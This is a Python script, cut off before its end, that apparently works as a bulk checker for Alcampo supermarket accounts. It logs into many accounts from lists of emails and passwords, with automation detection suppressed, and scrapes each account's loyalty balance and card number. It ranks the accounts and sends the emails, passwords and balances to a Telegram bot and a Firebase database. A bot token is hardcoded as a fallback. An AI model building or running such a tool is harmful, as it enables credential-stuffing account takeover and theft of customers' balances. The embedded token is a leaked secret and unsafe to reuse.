import sys
import time
import re
import json
import argparse
import os
import html
import threading
import builtins
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import pandas as pd


from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')

ROOT = Path(__file__).resolve().parent
ACCOUNTS_FILE = ROOT / "accounts.json"
EXCEL_FILE = ROOT / "saldos_alcampo.xlsx"

# Lock for thread-safe file writing and printing
log_lock = threading.Lock()

# Global state for progress tracking
progress_state = {
    "total": 0,
    "processed": 0,
    "success": 0,
    "money": 0,
    "zero": 0,
    "error": 0,
    "total_balance": 0.0,
    "start_time": 0.0,
    "elapsed": 0.0,
    "eta": None,
    "threads": {}
}

# --- GLOBAL PRINT INTERCEPTION ---
original_print = builtins.print

def print_and_log(*args, **kwargs):
    """Intercepts print calls to write them to consola.log in real-time."""
    sep = kwargs.get('sep', ' ')
    end = kwargs.get('end', '\n')
    file = kwargs.get('file', None)
    
    # We only intercept stdout/stderr prints
    if file is None or file == sys.stdout or file == sys.stderr:
        msg = sep.join(str(arg) for arg in args)
        kwargs['flush'] = True  # Force auto-flushing to prevent buffering in logs
        with log_lock:
            original_print(*args, **kwargs)
            try:
                with open(ROOT / "consola.log", "a", encoding="utf-8") as f:
                    f.write(msg + end)
            except Exception:
                pass
    else:
        original_print(*args, **kwargs)

# Replace built-in print globally
builtins.print = print_and_log


def get_firebase_url():
    url = (os.environ.get("FIREBASE_DB_URL") or "").strip()
    if not url or url.lower() in ("none", "null", "***", "undefined"):
        return None
    if not url.startswith("http"):
        return None
    return url


def get_telegram_config():
    token = (os.environ.get("TELEGRAM_TOKEN") or "").strip()
    chat_id = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
    
    # Check if they are valid, handling mask/null indicators from CI
    is_valid_token = bool(re.match(r"^\d+:[A-Za-z0-9_-]+$", token)) and token.lower() not in ("none", "null", "***", "undefined")
    
    is_valid_chat = False
    if chat_id and chat_id.lower() not in ("none", "null", "***", "undefined"):
        try:
            int(chat_id)
            is_valid_chat = True
        except ValueError:
            pass
            
    if not is_valid_token or not is_valid_chat:
        return "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU", -5049278431
        
    return token, int(chat_id)



# @section: Progress-Tracking
def init_progress(total_accounts, cycle=1, master_total=None):
    """Initializes or preserves progress state across execution cycles."""
    global progress_state
    firebase_url = get_firebase_url()
    
    with log_lock:
        existing_state = None
        if cycle > 1:
            # Try to fetch existing master state from Firebase or local file
            if firebase_url:
                try:
                    prog_url = firebase_url.strip().rstrip('/') + "/progress.json"
                    res = requests.get(prog_url, timeout=5)
                    if res.ok and res.json():
                        existing_state = res.json()
                except Exception:
                    pass
            if not existing_state and (ROOT / "progreso.json").exists():
                try:
                    with open(ROOT / "progreso.json", "r", encoding="utf-8") as f:
                        existing_state = json.load(f)
                except Exception:
                    pass

        if cycle > 1 and existing_state and isinstance(existing_state, dict):
            # Preserve master metrics from Cycle 1
            m_total = master_total or existing_state.get("total", total_accounts)
            progress_state["cycle"] = cycle
            progress_state["total"] = m_total
            progress_state["processed"] = existing_state.get("processed", m_total)
            progress_state["success"] = existing_state.get("success", 0)
            progress_state["money"] = existing_state.get("money", 0)
            progress_state["zero"] = existing_state.get("zero", 0)
            progress_state["error"] = existing_state.get("error", total_accounts)
            progress_state["total_balance"] = float(existing_state.get("total_balance", 0.0))
            progress_state["retry_total"] = total_accounts
            progress_state["retry_processed"] = 0
            progress_state["retry_success"] = 0
            progress_state["start_time"] = time.time()
            progress_state["elapsed"] = 0.0
            progress_state["eta"] = None
            progress_state["threads"] = {}
        else:
            # Fresh Cycle 1 initialization
            m_total = master_total or total_accounts
            progress_state["cycle"] = cycle
            progress_state["total"] = m_total
            progress_state["processed"] = 0
            progress_state["success"] = 0
            progress_state["money"] = 0
            progress_state["zero"] = 0
            progress_state["error"] = 0
            progress_state["total_balance"] = 0.0
            progress_state["retry_total"] = 0
            progress_state["retry_processed"] = 0
            progress_state["retry_success"] = 0
            progress_state["start_time"] = time.time()
            progress_state["elapsed"] = 0.0
            progress_state["eta"] = None
            progress_state["threads"] = {}

        # Reset consola.log (only in Cycle 1) and write initial progreso.json
        try:
            if cycle == 1 and os.path.exists(ROOT / "consola.log"):
                os.remove(ROOT / "consola.log")
        except Exception:
            pass

        try:
            with open(ROOT / "progreso.json", "w", encoding="utf-8") as f:
                json.dump(progress_state, f, indent=4)
        except Exception:
            pass

        # Asynchronously update Firebase Realtime DB
        if firebase_url:
            try:
                def reset_firebase():
                    try:
                        url = firebase_url.strip()
                        prog_url = url.rstrip('/') + "/progress.json"
                        requests.put(prog_url, json=progress_state, timeout=5)
                        
                        logs_url = url.rstrip('/') + "/logs.json"
                        banner = f"🚀 [SISTEMA] Iniciando Alcampo Scraper v2.0 (Ciclo {cycle})...\n"
                        requests.put(logs_url, json=banner, timeout=5)
                    except Exception:
                        pass
                threading.Thread(target=reset_firebase, daemon=True).start()
            except Exception:
                pass


def update_progress(thread_idx, email, status, saldo_str):
    """Thread-safely updates progress metrics, saves to progreso.json, and pushes to Firebase."""
    global progress_state
    
    saldo_val = limpiar_saldo(saldo_str)
    cycle = progress_state.get("cycle", 1)
    
    with log_lock:
        if cycle > 1:
            # Cycle 2 / Retry Mode logic: Update retry stats and reduce master error count
            progress_state["retry_processed"] = progress_state.get("retry_processed", 0) + 1
            
            if status == "success":
                progress_state["retry_success"] = progress_state.get("retry_success", 0) + 1
                progress_state["success"] += 1
                progress_state["error"] = max(0, progress_state.get("error", 0) - 1)
                
                if saldo_val is not None:
                    progress_state["total_balance"] += saldo_val
                    if saldo_val > 0:
                        progress_state["money"] += 1
                    else:
                        progress_state["zero"] += 1
                else:
                    progress_state["zero"] += 1
            else:
                # Retried account failed again; remains an error (was already counted in master error)
                pass
        else:
            # Cycle 1 Mode logic
            progress_state["processed"] += 1
            if status == "success":
                progress_state["success"] += 1
                if saldo_val is not None:
                    progress_state["total_balance"] += saldo_val
                    if saldo_val > 0:
                        progress_state["money"] += 1
                    else:
                        progress_state["zero"] += 1
                else:
                    progress_state["zero"] += 1
            else:
                progress_state["error"] += 1
            
        # Calculate time metrics
        elapsed = time.time() - progress_state["start_time"]
        progress_state["elapsed"] = elapsed
        
        proc_count = progress_state.get("retry_processed", 0) if cycle > 1 else progress_state["processed"]
        tot_count = progress_state.get("retry_total", 0) if cycle > 1 else progress_state["total"]
        
        if proc_count > 0 and tot_count > 0:
            avg_time = elapsed / proc_count
            remaining = max(0, tot_count - proc_count)
            progress_state["eta"] = remaining * avg_time
            
        # Update specific thread status
        progress_state["threads"][str(thread_idx)] = {
            "last_account": email,
            "last_status": status,
            "timestamp": time.time()
        }
        
        # Save to file
        try:
            with open(ROOT / "progreso.json", "w", encoding="utf-8") as f:
                json.dump(progress_state, f, indent=4)
        except Exception:
            pass

        # Asynchronously push to Firebase Realtime DB
        firebase_url = get_firebase_url()
        p_check = progress_state.get("retry_processed", 0) if cycle > 1 else progress_state["processed"]
        p_total = progress_state.get("retry_total", 0) if cycle > 1 else progress_state["total"]
        
        if firebase_url and (p_check % 3 == 0 or p_check == p_total):
            try:
                def push_to_firebase(state_snap):
                    try:
                        url = firebase_url.strip()
                        prog_url = url.rstrip('/') + "/progress.json"
                        requests.put(prog_url, json=state_snap, timeout=5)
                        
                        try:
                            log_path = ROOT / "consola.log"
                            if log_path.exists():
                                with open(log_path, "r", encoding="utf-8") as f:
                                    lines = f.readlines()
                                filtered = [l for l in lines if not (l.strip().startswith('#') and '0x' in l)
                                            and 'Stacktrace:' not in l
                                            and '(Session info:' not in l
                                            and '<unknown>' not in l]
                                latest_logs = "".join(filtered[-100:])
                                logs_url = url.rstrip('/') + "/logs.json"
                                requests.put(logs_url, json=latest_logs, timeout=5)
                        except Exception:
                            pass
                    except Exception:
                        pass
                state_snap = json.loads(json.dumps(progress_state))
                threading.Thread(target=push_to_firebase, args=(state_snap,), daemon=True).start()
            except Exception:
                pass
# @end: Progress-Tracking


# Install ChromeDriver once globally
try:
    CHROME_DRIVER_PATH = ChromeDriverManager().install()
    print(f"ChromeDriver installed by webdriver_manager at: {CHROME_DRIVER_PATH}")
except Exception as e:
    print(f"Error installing ChromeDriver with webdriver_manager: {e}")
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    print(f"Falling back to system ChromeDriver at: {CHROME_DRIVER_PATH}")


def update_single_check_progress(email, status, message, percent, balance=None, card_number=None, error=None):
    firebase_url = get_firebase_url()
    if not firebase_url:
        return
    try:
        email_sanitized = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
        check_id = os.environ.get("CHECK_ID")
        payload = {
            "email": email,
            "status": status,
            "progress_message": message,
            "progress_percent": percent,
            "balance": balance,
            "card_number": card_number,
            "error": error,
            "timestamp": time.time()
        }
        if check_id:
            payload["check_id"] = check_id
        url = firebase_url.strip().rstrip('/') + f"/single_check_result/{email_sanitized}.json"
        requests.put(url, json=payload, timeout=5)

    except Exception as e:
        print(f"Error actualizando progreso en Firebase: {e}")


def check_single_account(email, password, scrape_card=True, existing_card_number=None):
    """Logs in and checks the balance (and optionally card number) of a single account.
    If existing_card_number is provided, skips the card scraping entirely.
    Returns: {"status": "success"/"error", "balance": float/None, "card_number": str/None, "error": str/None}
    """
    driver = None
    try:
        update_single_check_progress(email, "running", "Iniciando...", 20)
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        # Performance: smaller window, disable unnecessary features
        chrome_options.add_argument("--window-size=1024,768")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-plugins")
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.add_argument("--disable-javascript-harmony-shipping")
        chrome_options.add_argument("--memory-pressure-off")
        chrome_options.page_load_strategy = "eager"
        
        driver = webdriver.Chrome(
            service=Service(CHROME_DRIVER_PATH),
            options=chrome_options
        )
        driver.set_page_load_timeout(15)  # Reduced from 25s
        driver.implicitly_wait(0)  # Rely on explicit WebDriverWait only
        
        # 1. Login
        update_single_check_progress(email, "running", "Cargando...", 35)
        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
        wait = WebDriverWait(driver, 15)
        
        try:
            accept_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Aceptar cookies') or contains(text(), 'Aceptar')]")))
            accept_btn.click()
            # No sleep needed: wait for the form field to be ready instead
        except Exception:
            pass
            
        email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
        password_field = driver.find_element(By.ID, "pwd1")
        email_field.send_keys(email)
        password_field.send_keys(password)
        
        update_single_check_progress(email, "running", "Logueando...", 50)
        password_field.send_keys(Keys.ENTER)
        
        WebDriverWait(driver, 20).until(
            lambda d: "compraonline.alcampo.es" in d.current_url and "login" not in d.current_url
        )
        
        # 2. Get cookies & request settings/loyalty
        cookies = driver.get_cookies()
        user_agent = driver.execute_script("return navigator.userAgent;")
        
        session = requests.Session()
        for cookie in cookies:
            name = cookie['name']
            val = cookie['value']
            try:
                name.encode('latin-1')
            except UnicodeEncodeError:
                name = name.encode('utf-8').decode('latin-1')
            try:
                val.encode('latin-1')
            except UnicodeEncodeError:
                val = val.encode('utf-8').decode('latin-1')
            session.cookies.set(name, val)
            
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
        }
        
        update_single_check_progress(email, "running", "Saldo...", 70)
        res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
        if res.status_code != 200:
            raise Exception(f"HTTP Error {res.status_code} fetching loyalty settings")
            
        # 3. Parse balance
        saldo_str = "No encontrado"
        match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
        if match:
            saldo_str = f"Tu Saldo es {match.group(1)} €"
        else:
            cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
            cleaned_text = ' '.join(cleaned_text.split())
            match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
            if match_text:
                saldo_str = f"Tu Saldo es {match_text.group(1)} €"
            else:
                match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                if match_alt:
                    saldo_str = f"Tu Saldo es {match_alt.group(1)} €"
                    
        balance = limpiar_saldo(saldo_str)
        if balance is None:
            raise Exception(f"No se pudo determinar el saldo. HTML: {saldo_str}")
            
        # 4. Optional: scrape card number
        # If an existing card number is passed in (from env or caller), reuse it directly
        card_number = existing_card_number if existing_card_number else None
        if scrape_card and not card_number:
            update_single_check_progress(email, "running", "Tarjeta...", 85)
            try:
                # Navigate driver to settings/loyalty page
                driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                # Wait for the "Mi cuenta Club Alcampo" button instead of blind sleep
                card_wait = WebDriverWait(driver, 10)
                
                # Accept cookies again if needed (quick check, no wait)
                try:
                    accept_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Aceptar cookies') or contains(text(), 'Aceptar')]")
                    accept_btn.click()
                except Exception:
                    pass
                
                # Find and click "Mi cuenta Club Alcampo"
                btn = card_wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Mi cuenta Club Alcampo')]/.. | //a[contains(text(), 'Mi cuenta Club Alcampo')]")))
                main_handle = driver.current_window_handle
                btn.click()
                
                # Wait for new tab to open instead of fixed sleep
                WebDriverWait(driver, 8).until(lambda d: len(d.window_handles) > 1)
                
                all_handles = driver.window_handles
                portal_handle = None
                for handle in all_handles:
                    if handle != main_handle:
                        portal_handle = handle
                        break
                        
                if portal_handle:
                    driver.switch_to.window(portal_handle)
                    update_single_check_progress(email, "running", "Finalizando...", 95)
                    # Wait for page to load the card number (which happens asynchronously)
                    try:
                        WebDriverWait(driver, 12).until(
                            lambda d: re.search(r'\b\d{13}\b', d.page_source) or re.search(r'value="\?clif=(\d+)"', d.page_source)
                        )
                    except Exception:
                        pass  # Use whatever has loaded so far
                    portal_html = driver.page_source
                    
                    match_clif = re.search(r'value="\?clif=(\d+)"', portal_html)
                    if match_clif:
                        card_number = match_clif.group(1)
                    else:
                        match_13 = re.search(r'\b\d{13}\b', portal_html)
                        if match_13:
                            card_number = match_13.group(0)
            except Exception as e:
                # Log card scraping error but don't fail balance check
                print(f"Advertencia: No se pudo extraer número de tarjeta: {e}")
        elif card_number:
            print(f"✔ Reutilizando número de tarjeta existente: {card_number} (sin scraping)")
                
        return {
            "status": "success",
            "balance": balance,
            "card_number": card_number,
            "error": None
        }
    except Exception as e:
        return {
            "status": "error",
            "balance": None,
            "card_number": None,
            "error": str(e)
        }
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


# @section: CLI-Arguments-and-Main
def parse_args():
    parser = argparse.ArgumentParser(description="Alcampo Account Balance Scraper (Optimized)")
    parser.add_argument(
        "--send-telegram", 
        action="store_true", 
        default=True,
        help="Enables sending summary and excel file to Telegram (default: True)"
    )
    parser.add_argument(
        "--no-telegram",
        action="store_true",
        help="Disables sending summary and excel file to Telegram"
    )
    parser.add_argument(
        "--threads", 
        type=int, 
        default=6, 
        help="Number of concurrent threads (default: 6)"
    )
    parser.add_argument(
        "--limit", 
        type=int, 
        default=None, 
        help="Limit execution to first N accounts (for testing)"
    )
    parser.add_argument(
        "--input-file",
        type=str,
        default=None,
        help="Path to JSON file containing accounts to process (default: accounts.json)"
    )
    parser.add_argument(
        "--cycle",
        type=int,
        default=1,
        help="Execution cycle / pass number (1 = main pass, 2 = retry pass)"
    )
    parser.add_argument(
        "--master-total",
        type=int,
        default=None,
        help="Master total accounts count across cycles (for UI progress tracking)"
    )
    parser.add_argument(
        "--check-single",
        nargs=2,
        metavar=("EMAIL", "PASSWORD"),
        help="Check balance and card number of a single account and exit"
    )
    return parser.parse_args()


def enviar_telegram_texto(token, chat_id, mensaje):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": mensaje, "parse_mode": "HTML"}
    try:
        response = requests.post(url, data=data)
        print(f"📡 Enviando a Telegram: {response.status_code} - {response.text}")
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Error sending to Telegram: {e}")


def enviar_telegram_documento(token, chat_id, path, caption=""):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        with open(path, "rb") as file:
            data = {"chat_id": chat_id, "caption": caption}
            response = requests.post(url, data=data, files={"document": file})
            print(f"📁 Enviando documento a Telegram: {response.status_code} - {response.text}")
            response.raise_for_status()
    except Exception as e:
        print(f"❌ Error enviando documento a Telegram: {e}")


def procesar_bloque(accounts_chunk, thread_idx):
    resultados = []
    driver = None
    
    def init_driver():
        nonlocal driver
        if driver:
            try:
                driver.quit()
            except:
                pass
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.page_load_strategy = "eager"
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        driver = webdriver.Chrome(
            service=Service(CHROME_DRIVER_PATH),
            options=chrome_options
        )
        driver.set_page_load_timeout(20)
        driver.implicitly_wait(1)

    for idx, acc in enumerate(accounts_chunk):
        email = acc["email"]
        password = acc["password"]
        print(f"[Hilo {thread_idx}] → Procesando ({idx+1}/{len(accounts_chunk)}): {email}")
        
        intentos_max = 2
        saldo = "Error: Desconocido"
        
        for intento in range(1, intentos_max + 1):
            try:
                if not driver:
                    init_driver()
                
                # 1. Cargar login
                driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                wait = WebDriverWait(driver, 10)
                email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
                password_field = driver.find_element(By.ID, "pwd1")
                
                # 2. Rellenar credenciales y enviar
                email_field.send_keys(email)
                password_field.send_keys(password)
                password_field.send_keys(Keys.ENTER)
                
                # 3. Esperar redirección que indica login correcto
                try:
                    WebDriverWait(driver, 15).until(
                        lambda d: "compraonline.alcampo.es" in d.current_url and "login" not in d.current_url
                    )
                except Exception:
                    if "login" in driver.current_url or "my.site.com" in driver.current_url:
                        print(f"[Hilo {thread_idx}] ⚠️ Credenciales incorrectas o bloqueo para: {email}")
                        saldo = "Error: Credenciales incorrectas/bloqueo"
                        break  # No reintentar si son credenciales incorrectas directas
                    raise
                    
                # 4. Obtener cookies de la sesión
                cookies = driver.get_cookies()
                user_agent = driver.execute_script("return navigator.userAgent;")
                
                # 5. Hacer petición HTTP con requests para el saldo
                session = requests.Session()
                for cookie in cookies:
                    name = cookie['name']
                    val = cookie['value']
                    try:
                        name.encode('latin-1')
                    except UnicodeEncodeError:
                        name = name.encode('utf-8').decode('latin-1')
                    try:
                        val.encode('latin-1')
                    except UnicodeEncodeError:
                        val = val.encode('utf-8').decode('latin-1')
                    session.cookies.set(name, val)
                    
                headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
                }
                
                res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
                if res.status_code != 200:
                    raise Exception(f"HTTP Error {res.status_code}")
                    
                # 6. Parsear saldo usando regex
                saldo = "No encontrado"
                match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
                if match:
                    saldo = f"Tu Saldo es {match.group(1)} €"
                else:
                    # Fallback: quitar tags y probar regex
                    cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
                    cleaned_text = ' '.join(cleaned_text.split())
                    match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
                    if match_text:
                        saldo = f"Tu Saldo es {match_text.group(1)} €"
                    else:
                        match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                        if match_alt:
                            saldo = f"Tu Saldo es {match_alt.group(1)} €"
                
                print(f"[Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
                break
                
            except Exception as e:
                print(f"[Hilo {thread_idx}] ❌ Error en {email} (Intento {intento}/{intentos_max}): {e}")
                # Cerrar driver en caso de error/congelación para forzar recreación
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = None
                if intento == intentos_max:
                    saldo = f"Error: {e}"
                    
        resultados.append({"email": email, "password": password, "saldo": saldo})
        
        # Update real-time progress state
        status = "error" if ("Error" in saldo or "No encontrado" in saldo) else "success"
        update_progress(thread_idx, email, status, saldo)
        
        # 7. Borrar cookies cross-domain vía CDP y localStorage para preparar siguiente cuenta
        if driver:
            try:
                driver.execute_cdp_cmd('Network.clearBrowserCookies', {})
                driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
            except Exception:
                # Si falla al limpiar, cerramos y forzamos recreación
                try:
                    driver.quit()
                except:
                    pass
                driver = None
                
    if driver:
        try:
            driver.quit()
        except:
            pass
            
    return resultados


def limpiar_saldo(saldo_str):
    if saldo_str is None:
        return None
    texto = str(saldo_str).strip()
    if not texto or "Error" in texto or "No encontrado" in texto:
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
    if not match:
        return None
    limpio = match.group(0).replace(',', '.')
    try:
        return float(limpio)
    except ValueError:
        return None


def cargar_cuentas_desde_archivo(filepath=None):
    """
    Carga cuentas desde un archivo JSON, Excel (.xlsx, .xls, .ods) o CSV.
    Detecta automáticamente las columnas de email y contraseña.
    """
    target_path = None
    if filepath:
        p1 = Path(filepath)
        p2 = ROOT / filepath
        p3 = Path.cwd() / filepath
        for p in [p1, p2, p3]:
            if p.exists() and p.is_file():
                target_path = p
                break
        if not target_path:
            target_path = p1
    else:
        # Buscar en orden de preferencia en la carpeta del script o en la raíz
        candidates = [
            ROOT / "accounts.json",
            Path("accounts.json"),
            ROOT / "cuentasError.ods",
            Path("cuentasError.ods"),
            ROOT / "cuentas.xlsx",
            Path("cuentas.xlsx"),
            ROOT / "saldos_alcampo.xlsx",
            Path("saldos_alcampo.xlsx")
        ]
        # Buscar también cualquier otro archivo .xlsx, .ods, .csv o .json en la carpeta
        for ext_pattern in ["*.xlsx", "*.ods", "*.csv", "*.json"]:
            for f in list(ROOT.glob(ext_pattern)) + list(Path(".").glob(ext_pattern)):
                if f not in candidates and not f.name.startswith("~$") and f.name not in ["progreso.json", "history.json", "top_accounts.json"]:
                    candidates.append(f)
                    
        for cand in candidates:
            if cand.exists() and cand.is_file() and cand.stat().st_size > 0:
                target_path = cand
                break

    if not target_path or not target_path.exists():
        print("❌ Error: No se encontró ningún archivo de cuentas (.json, .xlsx, .ods, .csv)")
        sys.exit(1)

    print(f"📂 Cargando cuentas desde: {target_path}")
    ext = target_path.suffix.lower()

    if ext == ".json":
        with open(target_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
            elif isinstance(data, dict) and "accounts" in data:
                return data["accounts"]
            else:
                raise ValueError("Estructura JSON no reconocida. Se esperaba una lista de cuentas.")

    elif ext in [".xlsx", ".xls", ".ods", ".csv"]:
        if ext == ".csv":
            df = pd.read_csv(target_path)
        elif ext == ".ods":
            df = pd.read_excel(target_path, engine="odf")
        else:
            df = pd.read_excel(target_path)

        cols_lower = {str(c).strip().lower(): c for c in df.columns}

        email_col = None
        for col_name in ["email", "correo", "usuario", "account", "cuentas", "mail", "user"]:
            if col_name in cols_lower:
                email_col = cols_lower[col_name]
                break
        if not email_col and len(df.columns) >= 1:
            email_col = df.columns[0]

        pass_col = None
        for col_name in ["password", "pass", "contraseña", "clave", "contrasena", "pwd"]:
            if col_name in cols_lower:
                pass_col = cols_lower[col_name]
                break
        if not pass_col and len(df.columns) >= 2:
            pass_col = df.columns[1]

        accounts = []
        for idx, row in df.iterrows():
            email_val = str(row[email_col]).strip() if pd.notna(row[email_col]) else ""
            pass_val = str(row[pass_col]).strip() if pass_col and pd.notna(row[pass_col]) else ""
            if email_val and "@" in email_val and not email_val.lower().startswith("email"):
                accounts.append({"email": email_val, "password": pass_val})

        print(f"✔ Se cargaron {len(accounts)} cuentas válidas desde {target_path.name}")
        return accounts
    else:
        print(f"❌ Formato no soportado: {ext}")
        sys.exit(1)


def main():
    args = parse_args()
    
    if args.check_single:
        email, password = args.check_single
        print(f"🔎 Iniciando comprobación de saldo individual para: {email}")
        existing_card = os.environ.get("EXISTING_CARD_NUMBER") or None
        if existing_card:
            print(f"ℹ️ Número de tarjeta ya conocido ({existing_card}), se omitirá el scraping del portal.")
        res = check_single_account(email, password, scrape_card=True, existing_card_number=existing_card)
        print(f"Resultado: {res}")
        
        firebase_url = get_firebase_url()
        if firebase_url:
            try:
                email_sanitized = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
                check_id = os.environ.get("CHECK_ID")
                payload = {
                    "email": email,
                    "balance": res["balance"],
                    "card_number": res["card_number"],
                    "status": res["status"],
                    "error": res["error"],
                    "timestamp": time.time()
                }
                if check_id:
                    payload["check_id"] = check_id
                url = firebase_url.strip().rstrip('/') + f"/single_check_result/{email_sanitized}.json"
                requests.put(url, json=payload, timeout=5)

                if res["status"] == "success":
                    top_url = firebase_url.strip().rstrip('/') + "/top_accounts.json"
                    top_res = requests.get(top_url, timeout=5)
                    if top_res.ok:
                        top_accounts = top_res.json()
                        if isinstance(top_accounts, list):
                            updated = False
                            for acc in top_accounts:
                                if acc.get("email") == email:
                                    acc["balance"] = res["balance"]
                                    if res["card_number"]:
                                        acc["card_number"] = res["card_number"]
                                    updated = True
                            if updated:
                                requests.put(top_url, json=top_accounts, timeout=5)
            except Exception as e:
                print(f"Error actualizando Firebase: {e}")
        
        if res["status"] == "success":
            try:
                top_local_path = ROOT.parent / "docs" / "top_accounts.json"
                if top_local_path.exists():
                    with open(top_local_path, "r", encoding="utf-8") as f:
                        top_accounts = json.load(f)
                    if isinstance(top_accounts, list):
                        updated = False
                        for acc in top_accounts:
                            if acc.get("email") == email:
                                acc["balance"] = res["balance"]
                                if res["card_number"]:
                                    acc["card_number"] = res["card_number"]
                                updated = True
                        if updated:
                            with open(top_local_path, "w", encoding="utf-8") as f:
                                json.dump(top_accounts, f, indent=4)
                            print(f"✔ top_accounts.json local actualizado.")
            except Exception as e:
                print(f"Error actualizando top_accounts.json local: {e}")
                
        if res["status"] == "success" and res["card_number"]:
            try:
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                    accounts = json.load(f)
                updated = False
                for acc in accounts:
                    if acc.get("email") == email:
                        acc["card_number"] = res["card_number"]
                        updated = True
                        break
                if updated:
                    with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
                        json.dump(accounts, f, indent=2)
                    print(f"✔ accounts.json actualizado con número de tarjeta.")
            except Exception as e:
                print(f"Error actualizando accounts.json: {e}")
                
        sys.exit(0 if res["status"] == "success" else 1)
    
    # Telegram config (robust parsing with fallbacks)
    telegram_token, chat_id = get_telegram_config()
    send_telegram = args.send_telegram and not args.no_telegram

    # Cargar cuentas (JSON, Excel .xlsx / .ods, o CSV)
    accounts = cargar_cuentas_desde_archivo(args.input_file)
        
    if args.limit:
        accounts = accounts[:args.limit]
        print(f"ℹ️ Modo prueba: Limitado a las primeras {args.limit} cuentas.")

    # Initialize progress files with cycle and master total awareness
    init_progress(len(accounts), cycle=args.cycle, master_total=args.master_total)

    # Repartir cuentas equitativamente entre los hilos
    num_threads = min(args.threads, len(accounts))
    if num_threads == 0:
        num_threads = 1
        
    chunks = [[] for _ in range(num_threads)]
    for i, acc in enumerate(accounts):
        chunks[i % num_threads].append(acc)

    print(f"🚀 Iniciando verificación de {len(accounts)} cuentas repartidas en {num_threads} hilos (reutilizando navegadores)...")
    
    if send_telegram:
        try:
            enviar_telegram_texto(telegram_token, chat_id,
                f"🚀 <b>Iniciando ejecución Alcampo</b>\n\n"
                f"📋 Cuentas a procesar: {len(accounts)}\n"
                f"⚙️ Hilos: {num_threads}\n\n"
                f"👀 <b>Ver en tiempo real:</b>\n"
                f"https://programacion1-sigma.vercel.app"
            )
        except Exception as e:
            print(f"Error enviando mensaje inicial a Telegram: {e}")
            
    resultados = []
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {
            executor.submit(procesar_bloque, chunks[i], i + 1): i
            for i in range(num_threads)
        }
        for future in as_completed(futures):
            resultados.extend(future.result())
            
    end_time = time.time()
    duration = end_time - start_time
    
    # Guardar Excel
    import pandas as pd
    df = pd.DataFrame(resultados)
    df.to_excel(EXCEL_FILE, index=False)
    print(f"\n💾 Resultados guardados en: {EXCEL_FILE}")
    print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
    
    # Resumen
    saldo_total = 0.0
    cuentas_con_saldo = 0
    cuentas_saldo_cero = 0
    cuentas_error = 0
    cuentas_ranked = []  # List of (valor, email, password) for ranking
    
    for r in resultados:
        valor = limpiar_saldo(r.get("saldo"))
        if valor is None:
            cuentas_error += 1
            continue
